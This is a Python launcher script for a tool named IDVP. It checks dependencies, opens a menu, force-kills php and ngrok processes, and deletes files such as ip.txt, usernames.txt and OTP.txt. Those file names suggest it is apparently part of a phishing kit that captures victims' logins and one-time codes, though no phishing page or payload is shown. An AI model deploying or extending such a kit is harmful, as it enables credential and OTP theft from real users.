#!/usr/bin/env python3
# Author:RobinHood
# Github:https://github.com/The-Robin-Hood
import os
import subprocess
import sys
if sys.version_info<(3,0,0):
    print('Please use Python 3. $ python3 IDVP.py')
    exit()
import time
from Core import Verification
from Core import Requirements as chck
from Core.menu import clrscr,menu,banner

def kill(): #Kills everythg
    if os.name== 'nt':
        os.system('taskkill /IM php.exe /F >temp1 2>&1')
        os.system('taskkill /IM ngrok.exe /F >temp1 2>&1')
        os.remove('temp1')
    else:
        os.system('killall -9 php >temp1 2>&1')
        os.system('killall -9 ngrok >temp1 2>&1')
        os.remove('temp1')
    if os.path.exists('temp'):
        os.remove('temp')
    if os.path.exists('Core/temp'):
        os.remove('Core/temp')
    if os.path.exists('Core/temp1'):
        os.remove('Core/temp1')
    if os.path.exists("Core/website/ip.txt"):
        os.remove('Core/website/ip.txt')
    if os.path.exists("Core/website/temp"):
        os.remove("Core/website/temp")
    if os.path.exists("Core/website/OTP.txt"):
        os.remove("Core/website/OTP.txt")
    if os.path.exists("Core/website/Verification.txt"):
        os.remove("Core/website/Verification.txt")
    if os.path.exists("Core/website/usernames.txt"):
        os.remove("Core/website/usernames.txt")

RED = "\033[91m"
RESET = "\033[0m"

try:
    kill()
    chck.hasPHP()
    chck.haschrome()
    chck.hasXterm()
    menu(0)
    kill()
except KeyboardInterrupt:
    clrscr()
    print(RED+"\nKeyboard interrupted !!!")
    print("\nExiting",end=""),
    for _ in range(3):
        sys.stdout.write(".")
        sys.stdout.flush()
        time.sleep(0.5)
    print("\n"+RESET)
    kill()
except SystemExit:
    kill()
    clrscr()
    print(RED+"\nLogged out !!!\n"+RESET)
except:
    print(RED+"\nSomething Went Wrong !!!")
    print(RED+"\nIf you can't figure whats the problem. \n Rise a Issue in my github repo"+RESET)
    kill()